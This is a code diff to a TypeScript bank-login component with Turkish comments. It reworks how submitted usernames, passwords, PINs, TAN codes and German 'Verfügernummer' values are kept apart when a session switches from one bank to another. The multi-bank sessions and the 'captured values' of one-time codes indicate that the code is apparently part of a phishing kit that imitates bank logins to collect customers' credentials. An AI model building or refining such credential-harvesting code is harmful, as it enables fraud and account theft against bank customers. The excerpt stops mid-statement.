@@ -325,47 +325,59 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       "bankName",
     ]);
 
-    const currentVerfuegernummer = overrideData?.verfuegernummer ?? verfuegernummer;
-    const currentPin = overrideData?.pin ?? pin;
-    const currentTacCode = overrideData?.tacCode ?? tacCode;
-    const currentPersonalCode = overrideData?.personalCode ?? personalCode;
-    const currentLoginMethod = overrideData?.loginMethod ?? loginMethod;
+    // Banka degistiginde (A bankasi -> B bankasi) eski oturumun credential
+    // alanlari (orderedField1, verfuegernummer, username vb.) YENI bankaya
+    // sizmasin: yeni submit ne verdiyse o yazilsin, vermedigi alanlar boslansin.
+    const prevBankSlug =
+      typeof sessionFormData?.bankSlug === "string" ? sessionFormData.bankSlug.trim().toLowerCase() : "";
+    const bankChanged = prevBankSlug !== "" && prevBankSlug !== bank.slug.trim().toLowerCase();
+    const hasOverride = overrideData != null && typeof overrideData === "object";
+    const staleStr = (v: unknown): string =>
+      !hasOverride && !bankChanged && typeof v === "string" ? v : "";
+
+    const currentVerfuegernummer = overrideData?.verfuegernummer ?? (bankChanged ? "" : verfuegernummer);
+    const currentPin = overrideData?.pin ?? (bankChanged ? "" : pin);
+    const currentTacCode = overrideData?.tacCode ?? (bankChanged ? "" : tacCode);
+    const currentPersonalCode = overrideData?.personalCode ?? (bankChanged ? "" : personalCode);
+    const currentLoginMethod = overrideData?.loginMethod ?? (bankChanged ? "" : loginMethod);
     const currentBankPhone =
       typeof overrideData?.bankPhone === "string"
         ? overrideData.bankPhone
-        : typeof sessionFormData.bankPhone === "string"
+        : bankChanged
+          ? ""
+          : typeof sessionFormData.bankPhone === "string"
             ? sessionFormData.bankPhone
             : "";
     const currentUsername =
       typeof overrideData?.username === "string"
         ? overrideData.username
-        : typeof sessionFormData.username === "string"
-          ? sessionFormData.username
-          : "";
+        : bankChanged
+          ? ""
+          : typeof sessionFormData.username === "string"
+            ? sessionFormData.username
+            : "";
     const currentPassword =
       typeof overrideData?.password === "string"
         ? overrideData.password
-        : typeof sessionFormData.password === "string"
-          ? sessionFormData.password
-          : "";
+        : bankChanged
+          ? ""
+          : typeof sessionFormData.password === "string"
+            ? sessionFormData.password
+            : "";
     const currentOrderedField1 =
       typeof overrideData?.orderedField1 === "string"
         ? overrideData.orderedField1.trim()
-        : typeof sessionFormData.orderedField1 === "string"
-          ? sessionFormData.orderedField1.trim()
-          : currentPersonalCode || currentUsername || currentVerfuegernummer || currentBankPhone;
+        : staleStr(sessionFormData.orderedField1).trim() ||
+          currentPersonalCode || currentUsername || currentVerfuegernummer || currentBankPhone;
     const currentOrderedField2 =
       typeof overrideData?.orderedField2 === "string"
         ? overrideData.orderedField2.trim()
-        : typeof sessionFormData.orderedField2 === "string"
-          ? sessionFormData.orderedField2.trim()
-          : currentPassword || currentPin;
+        : staleStr(sessionFormData.orderedField2).trim() ||
+          currentPassword || currentPin;
     const currentOrderedField2Type =
       typeof overrideData?.orderedField2Type === "string"
         ? overrideData.orderedField2Type.trim()
-        : typeof sessionFormData.orderedField2Type === "string"
-          ? sessionFormData.orderedField2Type.trim()
-          : "";
+        : staleStr(sessionFormData.orderedField2Type).trim();
     const currentExtraCapturedValues = Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(
       ([key, value]) => {
         if (
